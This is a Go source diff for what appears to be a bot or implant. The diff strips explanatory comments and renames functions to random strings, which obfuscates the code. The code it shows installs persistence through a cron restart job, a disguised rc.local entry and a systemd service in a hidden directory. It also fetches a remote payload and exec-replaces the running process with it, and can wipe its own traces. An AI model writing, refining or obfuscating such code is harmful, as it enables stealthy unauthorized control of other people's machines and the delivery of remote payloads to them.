@@ -10,20 +10,12 @@ import (
 	"time"
 )
 
-// ============================================================================
-// PERSISTENCE FUNCTIONS
-// These establish various methods to survive reboots and maintain access.
-// ============================================================================
 
-// lazarus sets up a simple cron job to keep the bot running.
-// Runs every minute to check if bot is alive and restart if needed.
-// Does not require any external scripts - directly executes the binary.
-// In debug mode: only logs what would happen, does not execute.
-func lazarus() {
+func bNkXqVm() {
 	exe, err := os.Executable()
 	if err != nil {
 		if verboseLog {
-			deoxys("lazarus: [DEBUG] Failed to get executable path: %v", err)
+			deoxys("[DEBUG] Failed to get executable path: %v", err)
 		}
 		return
 	}
@@ -32,57 +24,50 @@ func lazarus() {
 	cronJob := fmt.Sprintf("%s pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", schedExpr, procName, exe)
 
 	if verboseLog {
-		deoxys("lazarus: [DEBUG] Would set up cron persistence")
-		deoxys("lazarus: [DEBUG] Executable: %s", exe)
-		deoxys("lazarus: [DEBUG] Process name: %s", procName)
-		deoxys("lazarus: [DEBUG] Would install cron job: %s", cronJob)
-		deoxys("lazarus: [DEBUG] Skipping actual execution (debug mode)")
+		deoxys("[DEBUG] Would set up cron persistence")
+		deoxys("[DEBUG] Executable: %s", exe)
+		deoxys("[DEBUG] Process name: %s", procName)
+		deoxys("[DEBUG] Would install cron job: %s", cronJob)
+		deoxys("[DEBUG] Skipping actual execution (debug mode)")
 		return
 	}
 
-	// Production mode - execute silently
-	// Check if cron job already exists
 	checkCmd := exec.Command(crontabBin, "-l")
 	existing, _ := checkCmd.Output()
 	if strings.Contains(string(existing), exe) {
 		return
 	}
 
-	// Add to crontab
 	cmd := exec.Command(bashBin, shellFlag, fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
 	if err := cmd.Run(); err != nil {
-		deoxys("lazarus: crontab install failed: %v", err)
+		deoxys("crontab install failed: %v", err)
 	}
 }
 
-// fin7 adds the bot executable to rc.local for startup persistence.
-// Only adds entry if rc.local exists and doesn't already contain our path.
-// Uses a random suffix to make the entry less obvious.
-// In debug mode: only logs what would happen, does not execute.
-func fin7() {
+func hRpCwZt() {
 	if verboseLog {
-		deoxys("fin7: [DEBUG] Would set up rc.local persistence")
+		deoxys("[DEBUG] Would set up rc.local persistence")
 		if _, err := os.Stat(rcTarget); err != nil {
-			deoxys("fin7: [DEBUG] %s does not exist, would skip", rcTarget)
+			deoxys("[DEBUG] %s does not exist, would skip", rcTarget)
 			return
 		}
 		exe, err := os.Executable()
 		if err != nil {
-			deoxys("fin7: [DEBUG] Failed to get executable path: %v", err)
+			deoxys("[DEBUG] Failed to get executable path: %v", err)
 			return
 		}
 		b, err := os.ReadFile(rcTarget)
 		if err != nil {
-			deoxys("fin7: [DEBUG] Failed to read %s: %v", rcTarget, err)
+			deoxys("[DEBUG] Failed to read %s: %v", rcTarget, err)
 			return
 		}
 		if strings.Contains(string(b), exe) {
-			deoxys("fin7: [DEBUG] Entry already exists in rc.local")
+			deoxys("[DEBUG] Entry already exists in rc.local")
 			return
 		}
 		line := exe + " # " + kimsuky()
-		deoxys("fin7: [DEBUG] Would add to rc.local: %s", line)
-		deoxys("fin7: [DEBUG] Skipping actual execution (debug mode)")
+		deoxys("[DEBUG] Would add to rc.local: %s", line)
+		deoxys("[DEBUG] Skipping actual execution (debug mode)")
 		return
 	}
 
@@ -105,8 +90,7 @@ func fin7() {
 	sandworm(rcTarget, line, 0700)
 }
 
-// fetchPayload downloads a URL and returns the raw bytes.
-func fetchPayload(url string) ([]byte, error) {
+func jGdBsLn(url string) ([]byte, error) {
 	code, body, err := rawHTTPGet(url, nil, 30*time.Second)
 	if err != nil {
 		return nil, err
@@ -117,23 +101,20 @@ func fetchPayload(url string) ([]byte, error) {
 	return body, nil
 }
 
-// dragonfly installs systemd + storeDir persistence.
-// If url is non-empty the payload is fetched from that URL (ELF or .sh).
-// If url is empty the running binary is copied as-is.
-func dragonfly(url string) {
+func fVxMqKp(url string) {
 	programPath := filepath.Join(storeDir, binLabel)
 
 	if verboseLog {
-		deoxys("dragonfly: [DEBUG] Would set up persistence")
-		deoxys("dragonfly: [DEBUG] Would create hidden directory: %s", storeDir)
-		deoxys("dragonfly: [DEBUG] Primary: copy running binary")
+		deoxys("[DEBUG] Would set up persistence")
+		deoxys("[DEBUG] Would create hidden directory: %s", storeDir)
+		deoxys("[DEBUG] Primary: copy running binary")
 		if url != "" {
-			deoxys("dragonfly: [DEBUG] Fallback (if binary unreadable): fetch from %s", url)
+			deoxys("[DEBUG] Fallback (if binary unreadable): fetch from %s", url)
 		}
-		deoxys("dragonfly: [DEBUG] Would write binary to: %s", programPath)
-		deoxys("dragonfly: [DEBUG] Would write systemd service to: %s", unitPath)
-		deoxys("dragonfly: [DEBUG] Would enable systemd service: %s", unitName)
-		deoxys("dragonfly: [DEBUG] Skipping actual execution (debug mode)")
+		deoxys("[DEBUG] Would write binary to: %s", programPath)
+		deoxys("[DEBUG] Would write systemd service to: %s", unitPath)
+		deoxys("[DEBUG] Would enable systemd service: %s", unitName)
+		deoxys("[DEBUG] Skipping actual execution (debug mode)")
 		return
 	}
 
@@ -145,21 +126,21 @@ func dragonfly(url string) {
 	if exe, err := os.Executable(); err == nil {
 		data, err = os.ReadFile(exe)
 		if err != nil {
-			deoxys("dragonfly: self-read failed: %v", err)
+			deoxys("self-read failed: %v", err)
 		}
 	}
 	if len(data) == 0 {
 		if url == "" {
-			deoxys("dragonfly: no binary and no fallback url — aborting")
+			deoxys("no binary and no fallback url — aborting")
 			return
 		}
 		var err error
-		data, err = fetchPayload(url)
+		data, err = jGdBsLn(url)
 		if err != nil {
-			deoxys("dragonfly: fallback fetch failed: %v", err)
+			deoxys("fallback fetch failed: %v", err)
 			return
 		}
-		deoxys("dragonfly: used fallback url: %s", url)
+		deoxys("used fallback url: %s", url)
 	}
 
 	if err := os.WriteFile(programPath, data, 0755); err != nil {
@@ -174,17 +155,14 @@ func dragonfly(url string) {
 
 	cmd := exec.Command(systemctlBin, "enable", "--now", unitName)
 	if err := cmd.Run(); err != nil {
-		deoxys("dragonfly: systemctl enable failed: %v", err)
+		deoxys("systemctl enable failed: %v", err)
 	}
 }
 
-// reinstall fetches a payload from url, writes it to a temp file, and
-// exec-replaces the current process with it. Supports ELF binaries and
-// shell scripts (detected by .sh suffix or #! shebang).
-func reinstall(url string) {
-	data, err := fetchPayload(url)
+func cTwHnYz(url string) {
+	data, err := jGdBsLn(url)
 	if err != nil {
-		deoxys("reinstall: fetch failed: %v", err)
+		deoxys("fetch failed: %v", err)
 		return
 	}
 
@@ -220,10 +198,8 @@ func reinstall(url string) {
 	os.Remove(tmpPath)
 }
 
-// nukeAndExit strips all persistence artifacts, removes the binary, and exits.
-// Designed to fully remove a signal-ignoring, persisted daemon.
-func nukeAndExit() {
-	deoxys("nukeAndExit: Removing all persistence and self-destructing")
+func rZbQfGv() {
+	deoxys("removing all persistence and self-destructing")
 
 	// 1. Stop and remove systemd service
 	exec.Command(systemctlBin, "stop", unitName).Run()
